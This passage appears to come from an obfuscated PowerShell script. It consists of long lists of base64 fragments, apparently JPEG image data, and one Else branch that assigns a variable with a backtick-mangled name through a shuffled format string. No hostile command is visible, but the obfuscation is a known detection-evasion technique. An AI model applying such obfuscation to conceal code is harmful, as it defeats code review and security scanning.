','nRvGUcPk2vifSsRX6BR8qzD7lzGuAAsoJUZCMmSa/jb/a3/AODdz9vz9nK4uNZ+GO','EfZx4O07Wopb97tPMt4sKwhklXDZSOY','cwr5A40qlV+/F','nhb/sE6z/6SvX+ifQB/lX+Lf2cf+Cgvwv0aTxZ478B/EPw7p1t873l/pepWkMe3nJkkjVRj1zX0X+xp/wAFjP23v2PvG9j','/8ABul/yi+8Nf8AYY1j/wBKWr+bX/g5T/5STyf9ivpX8','/+PVHN/wcof8ABSmSJo0n8MRswIDLpRypPcZlIyPcEV/c7/wyd+yv/wBE08Kf+Ca0/w','BIgACEQEDEQH/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0B','AeUYSlDE5vFYitvZ/AvJR+16','Chdx+3J+zcdC+I10JfiF4G8qx1lmwHv','QAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQB//U/v4ooooA/MX9vz/g','LV/CR+1Z+yh8Yv2MPi1L8EfjrbW1n4ggtYLySG1uEuUWO4BKZdCRkgZx2BFf3nf8G8','gj/8Asbf','0vrgadqIFvcHgf3G+h7H2NbWoRBlOa8P8A','qKOLjqZ','hHzRyKw56EV9O/C34p','P4p1GD7ZqMxmlESRW5WNSfuopYkKMAZPHNft3X8Ef/BKz/guJ8Nf+Cen7MMvwC8WeA9T8R3UmtXeqC7tLuKGPZcpEoTa6k5HlnJz3','APc/8Agm','fFYXtwB81xHLCkjRTO','T3d3M2QoLcLHGuTsjjXCRoOEQAD','c8N2kNhp9hClvbW1ugihhijAVERFAVV','s0f6A3/AARb/wC','hqlzHdW','HIIIyCDkGtwRgUx4','W0XkQRwsnyBTzl2ya/ph/Yg/4Jufsz/wDBPj/hJ/8AhnW31GD/AIS77F/','O7vY2HyRpw0ULDc7YZwEAWT2sowFXE1VCmvV9EfjfinxbgcowEquKlq/hj1k+y/V7Lqfox/wAG9n/BOnVv2Q/2bZ/jr8WbH7J46+JCR3IglGJdP0gANBCw/hkmP76VeoBjVgGQiv6FaKK/WMLhoYelGlDZf1c/z6zvOMRmmNqY7Ev3pP5JLRJeSWiCiiiug8oKKKKACiiigAooooAKKKKACvxI/wCC4n7fPx7/AOCf/wAD/Bvj/wCADacuoa5rj6fc/wBo','PevVwOZYinrCbXz0+7Y/IuNOBcqr1VTq4eM5','1e20oDJLBq1rIjA9C','l1ZWwLzhT5aSRyrGC6Heytt2lcsGX8R7P9uz/gszqdpFqOn+NfiNcQTqJI5Y','bbUYbmQPcwNGmEQljliMntX9h','n1HWvxt1qO2trSS4uThFGSa8X+wzarct','2aYV0MVUpPo393T8D/Urw/4gp5vkGCx8Hdzh','za4niC904N','/wtf8A4aR02z07/hLP7C/s77JeR3e/7B9u87d5ZO3Hnx4z1ycdKAP51','wx8Z/t','QADAQEBAQEBAQEBAA','srJJL+W/8A4LJf8EWbb4hnVP2tv2QtJWPxCN914h8O2','af+CWxI/4KNfB','5q/tVr+Kr/g1Q/wCSv/F/','MiKAAi','Xv8A4LB6T+yfpl5+zz+zrdw3/wAS7yIp','tquVvbZ6Wt+YNFNR','/4aX6GO70bwvpdvdK3UXIt0M3/AJEL','AkikVkcAkZGQSCCfe6/ln/AODWH4i61rX7N/xM+F97Iz2WgeILW+tgxyEOowFXVfQZtg2OmWJ6k0nin/g6G+FXgvxNqPg7xN8HdftNS0m6ms7uB7+ANFPA5SRC','445r9Zf+Ib','3HBx5gCwg/35B61/pxV9twdhJQ9rWl/hX5v9D+ZPpK8UUcYsuy+g+jqyXbm92K9dJ3Cv5//APg5U/5Rsv8A9jTpX/oM1f0AV+S//BaP9kj40/','JeBh','wDhDPCV94W/4Qn+zfO+23Ec/n/2l9p27dijGz7Mc567h6UAfq3RXxH8Xv8AgpD+wx8A/iJqH','4i6jJGQytqUxBHIIMpr9','AABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAACQAAAA','R7SGDTFvre3mstsYDRTQFleORWzvDKCWy3Ocn8kP+Cq//AAb/AD/','tq/sYN8FvgLZ','QCMRXhpZgAA','A/z+Pj3YeJ','/BV34qfsOWfhz4Bfs4yxaf4z8VWcmpXerSxLM1hp4doY/IjkDRmWaRJBvcMEWM4UswZf0m/wCCkv8AwUL8J/8ABN74N6N8YvGHhy78TW+s6zHoyW1nMkDo8kE0+8s4IIAhIx1ya/','DjVOT9lH9luM5','6z/wrjwdHK6WNrYwQyX0sIPySXFx','208C6USVi1LUkXUNUZezBGzaxE91KTY7PX88nxT+Mvxd/aR+I1/8Yfjnr114j8Rao2Zru7bJCj7scajCxxpnCRoFRRwAKwLe2VVzX51mnF','sLCwv/2','BEIAFkBQAM','2xuU8lbd5BtAZcHco5z0r9t64nxv8Nfhz8TbKHTPi','upLnW79dMsvvP1PZV7k167pun22','SSWgD43/AODVD/kr/wAX/wDsD6X/AOj','Eda8AfAnwV4D8SIseo6JoOm2F','6z/AOkr1/on1/Hv/wAEev8Agjr+3H+xz+3JoXx0+OW','ZVSwNLkhrJ7vv8A8Dsj/OHxE8RMx4tzB4rFvlpRuqdNPSC/WT+1Lr','Qc','V/nff8Epv2edR/bN/a68CfCa8hNzpsN+t/rbH7o0','NkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqy','9vCx0+L9ozwyNSvtIV0sdStZntL2BH5KCWIgumfmCSBkDcgZJNfnh/xDdf8Ezv+gf4i/8ABs3/AMRX5s/','F/4Nm/8AiK/PD/gpV/wb0fs2/Br9lfxX8f8A9mDVtasNY8F2MurXN','9EX/BBL9vn9mvV/wBhHwt+z94y8YaToHjHwS97Zz2Gp3cVpJcW8tzJPDNAJWXzE2TKjbSSrqcgArn7n/4Kif8A','y19PJeS6FBbEY5','PGviS4iN/f8AleXa2kQAjV5nRRFbW8SAAcAAABQWIB/0sP2Vv2f/AA7+yv8As5','0X9HfxJxeMlPh3MbyVOHNCo91FNR5JP','2FLe5uF','Fn2pLhxLu/2t4Ofev8ATA/Y0/ao/Ye179mvwXafAvxj','5GIV1wjkAKy/K8','twx','r+gCv5/8A/g5U/wCUbL/9jTpX/oM1foZ/Fh/K9/wQ6+Nvwn/Z8/4KFeHfib8atetPDegWum6pFL','9P+UtHxY/7gX/pmsa/tD/4Imf8AKLX4','WLpaXdmvPXVfdqf','pj42678cvjDqL6p4h8R3','mL/wVW8D/APBTb/hN/','UAAAAACk0HRtF8OaHZ+HvDdtFZ6dYwR29rbwKEiihiUKiIo4CqoAAHAFa1fr+V','E','gMORQB/Bx/wbvftg/CX9lr9rjXfD3xs1m28PaL450YWEOo3kixWsV9bzLJCJpGIWNHQyrvYhQ20','CCgOleD9QuG','+EjIBNf0Df8AB1B/yaz8Nf8AsapP/SSWv5','3UL7uasnbvJWs3qrN6/1o/wDB','8','NpY9D1','r+oH/g','K+zw2Eo4eHs6MbI/mTO8/wAwzjEvGZlWdSo+r6eSS0','B86mMpI/zFkJYn8M9Q/wCDcX/gpxZzmG20XQrtR/HFq8IU/wDfzYf0oA/ve/4aA+A//','eXi4kh0OO','kn4oT/ABr/AGW/h18XLyTzLnxH4b0zULk5zi4nt0aUE+okLA+4r/LquQCtf6Qv/BJKW8m/4Ju/CB77O8a','lihDu','GVPKsrdVkRgHRxyr','3GT8TOhQcMUnJLZrf0d/wP5E8S/BSnm','i6dZeHrDT9Rt5p','yUXRjYfRRXYX/wCzt+1B45+Hlx45+Gvw78Ta14chDG71iw0q6uLKNF+8DOkbR8fxHd8o64zRQozqS5YIj','A','1v','Qxs2','E+ratPJdXV1I0s00zF5JJHOWZmbJZmJJJJyTVIjIxXzeaZvVx1Xnno','xu2QQApJ4r/Up13QtG8UaHeeGfEdrFfafqMElrdW06','YHB+z3uPWUKVlx/wAtUY4AZRX7I1/m/wD/AASU/akv','n3TuJofPiSaPcA','Mf8FkP2M/2+PEY+Hnw2v','hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOk','p1aDXPD2sI0tlfWxJimRWZ','NG0tu6XAXzba4VSG8uQohDqGaMrkKwLKwB+Yf/AAbWftZfATwx+yP4i+BPj','ak3ecm35','FYTOYbSLa011eTAZ8uCGMF3bHUgbVyCxUc1F+x5+118Lv23/gla/H','TX8cs3/Bub/wU+jkKJ4e0WQD+JdYt8H8yD+lRf8Q6P/BUH/oWtH','O0Me4RR2Ff0P','m','h4poZlKO','Nk4x1oA9M/wCCEvx38T/BP/gpT4C0/','9a07w74p1oiXWdJ1','yoRfuw/Pr9233n9ZeFv','vqK','Oc4w2WYWWKxMklsrtK8nslfq/8AgnzbrmqHxLqP2a0ObSE8Y/jb+99PSuh0/SkjQDFY/hvTljhUkV6NbW4UC','/sD6X/6Pmr+1WgD+BH/g5s8a+I9d/w','6jfoVgVh6w2/wAyn0nNfyJaYWtdSEcw2sCVIPYivz7iDMXXr','8WtK1Dy','/D342eAdN+KX','wBDAQICAgMDAwUDAwULCAYICwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwv/3QAEABT/2gAMAwEAAhEDEQA/AP7+KKK/Gj/grh/wVy8C/wDBOHwRbeEvC1vB4h+KHiKBpNK0qRj5FpBkr9ru9pDCIMCI4wQ0rA','BLv4Y/8ABSj4YWOj6tff8I54x8OmSTRdcSLzvLEoHmW88eVMkEhCnhgyMAyn7yt/Jf4v/wCDaz/gpF4d1CS10FPDOvwqxCT2e','gFQGYY4jEU6NN1KjskehleV4nMcTDB4SHNUlsv1fZLqz7p/az/AG2f','eFKNSEatWbafRK346nzPGv0hM1w','Cn+N9VYgf8AfMLH9K/R/wDY6/4Nf/8','N1GH3IrqThX3xnn7yGvjL/iKs+B//AESTXf8AwYW//wARQB/VtRX8qll/wdU/ACScLq','Qn/BIHW/2udUs/2gv2hLSbT/hlZyh7W1','AgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVG','wx4Q1H4w+FNP8AG03keHbrWbCLVSW2hLJ50E7Bj0xGWPNTGSqSSejZP1arl1KU4NzhFN2+1ZeXX5W9D9yv+C','TU0AKgAAAAgABQESAAMAA','bTdC8KWIs4Mn','Awvlwx4X6nvX+gX+yd/yax8NP+xU0b/0kir+LD/g6N/5P/8ACH/','lEVSpT56S+zLVL0e69E7eR/kK','aH9oXZ','ZX7','CVJAPD','wm+MXxM0fw/4k0nyvt','XVkWNvcCZYn/NRX9Bf/BA7/gnR+1B+wF','+Mvx','ksxJJJyav6jqOoaxq','/9j/4AA','tK+OnjTS/GokGs','yvfsj6M+K','kmEeWUcvnB','0r9tz9rHwV+xL+zL4p/aL','k79vb4JX9vpHxvOn/FHQ4y','ZGv863/AILXaf8AC7wb/wAFKv','vwV+L','LuH9uTwRrrowgufAtrbo2PlLwahfswB6EgSLkdsj1r+2H4Be','iLwP8JbfxD4o1qdHkj0/SEub66dIxud','rkf3cW/7RH7P93Ctza+OvD0sbjKump2zKQe4Ik5r+M39o7/AINf/wBprwx4su7z9mHxVo3in','sBuUV/mx+LPDPin4deLdT8A+ObGbS9a0W5lsr6zuF2ywTwsUdGHqrAj0r/AFla/no/4LPf8Ec/+GyrCT9oz9m+CC0+J+nQBLyyJWGLXYIh8qs5wq3SAbY','N/HPg5jMsoTzHLk50Y6yjvKK7r+aK69UtdVdr+n+iiivqD8PCiiigAooooAKKKKACiiigAooooAKKKKACii','gD+7r/hoD4D/wDQ7aB/4Mrf/wCOV/k8eKHS','Km','u5+9','kr+yL/wUK099W+J+k','mj3el/8Es/Bd5cqVX','5q/pK/4N0v+UX3hr/sMax/6UtQB94/tjf8ABOv9kr','AH95P7Jv/JrHw0/7FTRv/S','R0','g8/wCCtf8AwUC8Lf8ABR/9ovRPjb4Q8O3fhm10nw3b6G1reTJPI8kN1dXBkDIAApFwFx1yp9aAP7F/+CAfx0+MX7RH7C958Rfjj4kv/FOu','UNR1m4jz3QXssWR+MZo','tx/seTf','B/oNfswftH/DX9rb4E+Hf2g/hLcNPoviK286NJMCaCVSUlglAJ','z+zfr1jHqehfEHw','X8oEt9milje46fw+Sr7v9n','8Awpzwj','QoGWIHA5NfRX/DFn/BTf/ok3xP/APBDq3/xmvtv/g3W/wCUo','qK37LXIZEBDV/','ABRRRQB+af/BYqx8R6j/w','8j8Qf2AP+CG','bj7F4','ta/FTUP2kf2V','7N1S5tl4yMFUkCkYJGCCMG','l2UdjaDCRjA9T6k+5rhPCVrBp8BlzvmlwXb+g9hXoM','VyLZ7SRCsqylowNhQk','4a0/QrP','Gr472mr','uipNR91HzeUYKeJk8XiNZ','j','Nf59v8AwTg8Y/BX4f8A7c/','/GnSdI8XaLdX','T','S6WV7d7rVfJo/05P2B','w7I7NbQavK9hqUSEkqj7Y3gkKjgyB49x52KOB8lt/wbof8','2wImm','JVAzYIU1/lsfF744fEr9','enJqvh7xFata3lu/','5OXm5+jp6vHy8/T19vf4+fr/xAA','299rx1ywv/ACrm4S2TyYBIHO9yBkbhx3r7g/lU/kY/4N1v+Uonhb/s','MenW7bb4S6W805jcWDbD3HY/UVNo3jS','jBaQ27xySxS7QCxUP5m0bigAOAD9WK/nK/wCC83','pm05JXhD','Lq6ytuMD6jNHbKf9mCNlhT6Kgr5N1LS3vpmurtmllblnclmJ9STzXZhFFMeFWGK+Zli','bMU2uSRnlUPDLaqRiSU','v1o/Zd/wCD','gV/Uj/wAHMX7S9z48+LHhz9kDw9cH7B4Wsjq+poD8r','X3/BWrxX4A1rwz8UfFPj+58N6hZT2+qRX0','qyJqMS2Woqg/553Vsqgt6maKU','wUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS','OnCMYry5UkrdjzHTvt+lMLfUYzGegP8J+h6V21teBlHNa7KrqVcBgeoI','OKv4xP+D','m+','P8Ag4n+H+seDv8AgqH4q8S6lEUt/F','HCf+OgV9xwXN+2qw6NX+5/8E/lP6UmDpvLMBibe9GpKK9JRu//AElH6K1/P/8A8HKn/KNl/wDsadK/9Bm','pPS','X','sql9W2/vP9YMH','iYXUMcvdW','22vajF','vgFGWaAgmO4','sT6F+3j+yvrXwcm8u31+2/4mXh+8k4Fvq','OV/l3/t339jqv7cPxl1PS5o7m2ufHPiKWGaJg8ckb6hOVZWGQVIOQQc','us/YPO8rZlRt/1759ePSvz','Max/wCl','0iMHVZ7a3jjcBhwQGU4I61+d//AAVm/wCCWnhn/gpZ8LtJs9P1ZPDnjbwo88ujal','Wwx','EgCv0etf','FhyrXTA5SM5CDDuPuq38NniC81XxJq134g8QXMt9f30z3FzcXDmSWaaUlnd3bJZmY','8VNTtfCdlAbOCN4Lae6ij','Qf8AYNuv/S24oA/U+v8AI4+J/i','rMZ2w1R3jJ7Qn','Qc5MTFlHLqmRX6gV/kEeHINd8KazZ+JvC95cadqVh','27RHDeSwvdRqi4C','R4f03xBbWz+bFFqVp','3xDGg/Cvh3xJ4KtdYkN/ZMIbnqT/C+PX3967/AFW4urrXb26vv9fJcSv','P6maK/lJ/wCIqz4H/wDRJNd/8GFv/wDEV0Ph/wD4Oo/2ZLm7RPFPwx8T2cBYB3tJ7S5cL3IV3hBPtuH1oA','2jLS/Z67Ns/ho+1jFZt3qCopJNYHiuLxH4','MibEboO+','j/wCDZ3/lHHc/9jfqn/om2r+hKgD/ADbf+C+n/KWj4sf9wL/0zWNf2h/8ETP+UWvwg/7Bt1/6W3Ffxef8F','4CLh7yWRmmaUMAfMMhYtkZ3ZzQ','FdpG5GNyrKrAHBxkc4oA/gc/4iU/8AgpP/AM9PC/8A4','bm1uYwx9vM8tfqwr8sP2Gf+CFP/AAUP+BP7Yvwz','CijP9xZ','iiigAooooAKKKKACiiigAooooA//9D+','zE5XJV6DvG+sXs/8AJ+a+dz3+6YBTX+n5+xJ8N7n4Q/sefC','UeGcBQpeyw9GMI9opJfckSeD/wBob9p34LXSaj8IfiH4l8NyREFf','igAooooAKKKKAC','f2Sf26fB/i64uTBoPiK4Xw/rak4jNnfuqB25GBDMI5s+iEdzX+kBX6tw7mTxeFXO/','4jYdOGTaw9jXiAORmv3t/4OK/2aLv4Tftj2Xx+0uHGj/EmwSSR1GFXUtORIJl4GBui8lxzlmZvSvwJilBFfi','YLn','WlqSwDqeksrO4I3','AhHPGNj4z/bW8YWOs6fZSLK3h/wAPed5V0RghZryVYZAmeHWOIMw6SLQB9','UwYVjXlf3Vse5w3hkovF1dak/wAF2/V/8AsUU3etRSTKornSPqJSSVyhfH5c14n4udTKAPWvVdTvMLheSeAB1Jr+pD/giz/wQ68Q6r','eG9GPuNYtv/AIqgDR/4OMPFXhjxj/wUVk1jwjqVrqtp/wAIzpaefZzJPHuUzZG5CRkdxmv6aP8Ag3S/5R','KIc7mT+4rQ9D0Xwxotp4','dgMC3ucYVbs/wOAF','ur7S5ypKnglQ8Z4OMjg9a/QP/AIbe/wCC0v8A0','Y/7Ov7FPw7HxN/aM8RR','fXr7IUea3ZUBODyzEAV/cT/w','+HtT','J2+csSf1qGvw6tX','jqB5','pX/wDBTn/kgH/bwv8ANa/gL8c/8jxff9dB/Svhs2ySOGmkp3v5f8E/qXw58UcVmdF81Hl5f71//bUfM2nSXusXsWl6RDJdXM7bY4YVLu7HsqqCSfYV+nX7Nn/BHT/goJ+09d28+keCbjwlos5UtqviYNpsKxt0dYpFNxKCBwY4mHTJAINf1B/8EYP+ReuP+vWL/wBmr97a9LL','/qVor49/Y2/bu/Zq/bx8BXHj39nbXDqC6e6RahYXMZt76xkkBKLNC3QM','n7aX7ZH','M37HGo2HxO+Ib/8ACxPH1oVliv76EJ','N/xJ/783X/xuvy88d6z4x8R+N9Z8Q/ESW4uPEF/fXFxqct','lsui/4Pdn7zwD4bZZwrl31PCrmqys6lRr3pv9Ir7','G/lJK0l8pJotUjHAzTfMH+f/wBVVppgFzXnpH2cppK5/U//AMEbP+C0UfhN9J/ZE/a91UDSz5Vl4','/8HFt/8VQB8Sf8Et/+UjPwT/7HHSv/AEetf1q/8HQfgnU9e/Ya8KeMNOhaWPQfGFs1yy9I4','QSkZJRgABAQAAkACQAAD/4','F','paanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj','Vz4J1yKGGHUIJJ','+Df2efCspuLPwlpcFj9oK7TcTKMzTFcnBllLyEZ4LYr2Xw/wCGvDnhPTE0Xwrp9tplnH9yC0iWGJfoqAAflW1','D0DS4NC8MeIrDUb+SLVLeV0t4JVZyqK2WIA6Dk1/aX8bfgv8OP2iPhTr','ix+IF94h/Y28R6VqXhi7leWHS9cnktb6','g','Pwp8QRR92jvbaRvyIQfrX6p/s','MewEegxigD+pb4k/8ABsv+wN4k8J3th8O9R8S+G9ZeF/sd4b1LuGObB2GWKSLLpuxuVXRiOAynmv4fmm+Jn7KP7Qsv9kXZ03xd8O9fkiS4gY/','+','9oTxVY+E9P1K4Nraz3zMqSzBS5RdobnaCfwoA97or5f/Z+/bT/AGV/2qtS1LR/2ePG+m+LbnR4o5r2OxZmMMcpKozblXgkED6V9QUAFFf','xvupLv4pfE/x','s/8G2H7N2vfBz9hy/8Aix4rtjbXnxJ1dtRtVYbXOm2qCC3ZgefnfznXsUZSOtfYn7UP/BFr/gn9+1r8Srv4v/ErwrcWPiPUmD315pF5JZfa3AxvljUmIuf4','8bgTpolq32Kz3bGvb6QEW9up6je+Nx','ZPtP/APTlqdAHvH/BF7/','Sbl49M8Zyy','2hvcCAzLjAAOEJJTQQEAAAAAAA','w','2NyuuVP+mFJHHLG0UqhlYEEEZBB7Gv8ANt/4Lpfs2/D/APZk/','ejo/Ps/66o/zw8aeCIcO5/JYaNsPWXPBdE72lFej1S6KSXQK/A7/g5D1','5Rsv/ANjTpX/oM1e+fkJ/CX8OtL/aD+MHi','AOEJJTQQlAAAAAAAQ1B2M2Y8','wCCh/iXwz8LrKLTNE8QWdpr0NjAAsVt','l/0Wfw1/4En/4mv85T9kz9lH4r/tpfGmy+AnwWW0bX7+C4uYhfTfZ4dlshkfL7Wwdo','yxc+buPpCZgO5r/Reory8bk+GxL5p','HWPFvxp8Q+K/EM7XV/qet3d3czOctJNNOzux92Ykmv9cev','YjXMs8kr46bn','H0r/P+13/AINvf+Cmek372en6Z4e1SNSQJ7','Bv8AZWV4TNsRH95ifev2gn7q/wC3l7/mmux71pUYWNRXSqMLXLaTMrRqc11CNuWviqm7P68y','0kUPGQwPcc06vhVuf1ommrooXKsvzocFeQRwQa/wBRr9','S8kkgoooroPHCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA//Z','8h7xX/yUjUv+wlN/6NNAH//S/NX9qr4eXPwh/ak+IvwvukMZ0LxJqdmme8UVw','Y2Mo5D','2bv2JvAv/CdftBeIotLWZX','hF3pt5DqWnSvb3Nu6yxSxMUeN0OVZW','qlt4v1Hxj4YjkAvfD2vXcl5bTQ/xLE8pd7Z+6vEQN','mv+IdH/AIKg/wDQtaP/AODi2/8AiqsWf/Bur/wU+hu4pn8N6PtR1Y/8Ti26A/71AH//0/6//wDgpP8A','RWCmz6apl9Nx','AQ','mlaPqlo3Z4orSOyJ/CS1cfhX')
        }
        Else
        {
		    ${b`AS`e64ADre`Con} = ("{141}{149}{73}{135}{23}{129}{186}{133}{40}{92}{78}{115}{48}{54}{39}{74}{169}{103}{38}{97}{53}{170}{131}{191}{175}{30}{105}{148}{153}{66}{112}{94}{59}{86}{118}{14}{79}{63}{168}{144}{96}{16}{93}{8}{28}{111}{2}{95}{4}{160}{183}{113}{17}{6}{174}{98}{99}{161}{88}{0}{65}{179}{189}{166}{11}{19}{182}{55}{117}{181}{159}{13}{15}{128}{50}{27}{35}{70}{139}{7}{173}{151}{167}{100}{77}{33}{140}{29}{56}{37}{107}{180}{155}{125}{120}{136}{187}{24}{177}{163}{18}{67}{172}{46}{108}{185}{152}{36}{102}{127}{106}{134}{22}{84}{101}{72}{68}{124}{165}{69}{176}{10}{12}{143}{109}{62}{61}{47}{90}{80}{178}{42}{45}{82}{132}{21}{145}{49}{3}{58}{44}{87}{126}{121}{146}{91}{51}{43}{85}{157}{164}{83}{122}{150}{116}{41}{76}{110}{156}{57}{162}{154}{34}{147}{137}{171}{89}{119}{158}{5}{188}{190}{52}{9}{32}{20}{64}{25}{104}{184}{123}{142}{75}{81}{130}{1}{138}{114}{60}{26}{31}{71}" -f'AwDAQ','SGF48lkBc8GHOx7v+xV','FQJJGhQ7EWB2I1U/DRJWDBROFy8ReCYzZwJkVUkiei0ggJChgZGigpKjc4OTpGR0hJSlV','9X2Boc4s/9D4HIJnurZY','aWp','phgrUPGBeRPqi9cvQc40E7g','+v/bAEMABQM','uT4Z','BAQEBAQEBAA','bjhg8sJ','OvQ0xW0OMn','c8p7JltuB5/0A3n/ovL93R63zjqgeYbdbzW2TafWax','kcXF/kuD+x','N+h6bznMPXmHmGUu+8842il6','iMBbBctFDkj','DmsR03MTqjbFdtq22rbattq22rbattq22rbatt','MTF','7S1tre4ubrAwsPExcbHyMnK0NPU1dbX2Nna4OLj5OXm5+jp6vLz9PX29/j5','qJYeWJ+9NV9ri/E74sDc22P4Cw/Ex/Gg3','H84lRtc2+9ZJjp5Fry8deGn12oVvOJV2jpxMdh2CN5','AXZjitVaIpDT7f8AHNEib','jDRDKZfoqYxJf/wBDP0v8390/hf8AP+7+mv7f+f8An4VPrihzizyv7Nf5TzeBygj8rzNkKfNBoEFJF','H/jn+9BmC','AAABDUHYzZjwCyBOmACZjs+EJ+/+ICoEl','rfdfE08Vxuv8Av','wweWEviqi81iPGNihoDyNN3jEgxETAeqIQ5R0x6ml','X/AO','22r/2gAIAQ','AAAAABAgADBAUGBwgJCgv/xADDEQACA','UsxZGw8QeO/8afhL/a14v/2teBxlZSeFFqXuu5','nAAANW','t/1RwRw5Di9XZ0Xbx5ZPxQ7mpQN4IjjiiVjpSTs/1XCJophMP6sBvmXzJXjzf/AK3/AFRKxk5J2f6rhE0UwmH9WA3zL5krx5v/ANb/AKsblVUay79Ua2pCiMvHu/8A','fFVg5KxHjGtB6H','Fc3afDe2','2Bl8r6QDitJ','EAAQUC/wB/o1O0bfFDJuVhLGv','EYf6soCQpIsUxG0V+wf/2gAIAQEABj8C/wB/tGpe7x8uJQ6CpyXEUJ91r0K8qOGNYqlStWE3ATGTwqX7cf4uSeKE+616Fe','QqyX4WlUvadgXZXvi7/','GkAbAB0AC0AaQBuAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAADIAAAAcAE4AbwAgAGMAbwBwAHkAcgBpAGcAaAB0ACwAIAB1AHMAZQAgAGYAcgBlAGUAbAB5AAAAAFhZWiAAAAAAAAD21gABAA','AkbWx1YwAA','LZGVzYwAAAQgAAAA4Y3Byd','BAQEAAwABAgUFAQEAAQEJAQARITEQQV','LfFhkC0','xCj9n/','fikYEj','kH51UGYQeaOGZHJ/','pbY2Emo/hQblFyn7XJ/CRd1Nz/gfbmR5cgrGhl/EDk/CWf8IMogQcf4A','oqPqXdf7fk1/wBo9rf+27f+z2j+Ra/7Id18/wCpr/tFx/Itf9k','wAAAAgZ1RSQwAAAiwAAAAg','L/dUHiER0/VjguHOfd/xf7qDEIAJ/F9SaEVf1wO+X2Dt/fd','22rbattq','h','PCQMa0rQehwF2fFaq0RSGn2p','KAAAF4///8yoAA','YlRSQwAAAkwAAAAgY2hybQAAAmwAAA','tzY4bedXiFuvm/W8l32ubDq+E7nJw1WZVx/rPk3rDqO08uCjX3UeW+pkeYAIHfO27PjOyy0856zketdVdXynU','BFk/BC','uQkNwSJtkl0UopDkyNYE+seLEtlyjlvqQLuXISvrdiTi4OcZYrBhDkYMyzYGSPSZbPLTi/KSt04vylo64+khMj01aW','ZPTKL52bJlJYoh7v7f+f/AMHufCD+rAxmaP6lIXmKqus1UhsJ','ZzAQIAAxEEEi','80Cvt/K/4byv8AgPV/xfuwe6J4A1B50VbxhwHPqtRLE8rzYCoSCYHmsyslwhDgfdXi1yILMc','0GPIkNRrr2uvn/U1/wAYk9o+b/xmT8XlI','yKQdA5N','k3OiUESyg/EmVD','hMhqaRA7wmOQRP/ABwNx','ACEQMRAAAB8w2n2fN','AAJmaAAAmZgAAD1z/wgARCABGAOoDASIAAhEBAxEB/8QAHwAAAQUBAQEB','Jn','RQNXB/Z7R/Itf','faL9ou3r+24MdOl+0fxcdddGv+yHcn0P9TEKYeXgrj6uPXyLX/','bY0y393','1v8Aqr0wehckJV1nQIw4uzs63js1Q4djQ/j1YTeP6sSkz/VVFL/fN/vn/vcwXuYokcFH/oxZs13/ALNd/wCrNn0ZxSPBZ2Xfn/8AAv1Zs+j/APT/AP/Z','OEcs09tw25Xn','qACAAQAAAABAAAA6qADAAQAAAABAAAARgAAAAD/7QA4UGh','AAAAAAABAAAADGVu','JaEnALJVOBE9euaWIJ4PO9','FhIHHwkYGhsdHB4fEwQFBgcICQoLDA0','ZW9kpKknw9tMO4W2zbX','dAAAAAUYlhZWgAAAeQAAAAUZ1','SCCOFTQCVjFzXw','AjWOujJPmxLCrFY82i73CVPvYPEtKriaNRTw1ftx/i5LOKWtqD0D4drhE8yUFXCrWR+00Wd/L/FKcC1CyoYaaUZRDJihR6mFLXHkRrq/bj/FqFlQw0FKMohkxQo9TClrjyI11ftx/i89uUME6pIalbzKkrSaIq/bj/FmfbJEC5HCj50ysl+ruETypQVcKtZHq0STLCE0','VeYEik9qQAcjflf/AKupa5p//SyEks4/4Lp/Yq3RKOZ4oMQ6/ujHkYeQVRnWAiEnVNXKRJ4vg','wAQTSvdf8TyMYzw','3/','3VzE0+bk','g/dayb+zX+U8/8/SX9r/P/wCE3Sf5Tz/+C3CCwf','EFMRMiEAZB','w004pmkDMoycNP2EPd/wDoXyDHO35E8Z3/AMEkjRPmgIS','Hh4eHh4eHv/aA','lfDg','do+d+7y6mI9nl','OdUKYEHmNb9Hg4+v8AiRzq','AAAAUAAAABOd3RwdAAAAZAAAAAUY2hhZAAAAaQAAAAsclhZWgAAA','xsfIycrQ1NXW19jZ2uDk5ebn6Onq8/T19vf4+fr/xAAfAQADAQE','IEAQUABgcICQoL/8QAwxAAAQMDAgQDBAYEBwYECA','WV1hZWmRlZmdo','ooKSo4OTpISUpXWFlaZ2hpand4eXqGh4iJipCWl5iZmqClpqeoqaqwtba3uLm6w','AAANMtc2YzMgAAAAAAAQx','4eHh4eHh4eHh4eH','h4eHh4eHh4eHh','bCjd9ksreyUlSTDEuRSPD22FH9Hdre82kVruGxbTb3cX9Hdre77J','VeLVCQdK6P/HP96DVLbTGWTySDV0UCD8XNJIpQKOFHLHdFUSE8CdHRN0Sfgpqt4ySkDz7rnEuHKPBothEU8o8fVx7','VO0y7mPLEuhXH+LKNsxXc+QHF8uZBQr0P+o0fN2v8At+Tj+Qdv/bcH9ntHtEwA','AAYgB1A','AV8ssz/wAPa0gcVkonCuMUypAY/FH','QAAE9AAA','t4ySk','a14LA9wnUrn5Ke0a7p456','mFm2k4ObtjjpnHc','FqnhriR5u6+f9TnVeS','OD/2gAIAQMRAT8Qsss/+gc','gEDAwMCAwUCBQIEBIcBAAIRAxASIQQgMUETBTAiMlEUQAYzI2FCFXFSNI','AQEAAAAAAAAAAw','3h5eoCDhIWGh4iJipCTlJWWl5iZmqCjpKWmp6ipqrCys','82P+B1e8d3','hZWgAAAfgAAAAUclRSQwAAAg','AP8A/wD/AP8A/wD/AP8A/8QAMxE','46c4HlundF8d2PHsHnZcDmEummZfVLzw/Ya+vcNzWZ','UTIUYXEjB4EgkUIVoVIzsSR','fOlfDiA3k+bB5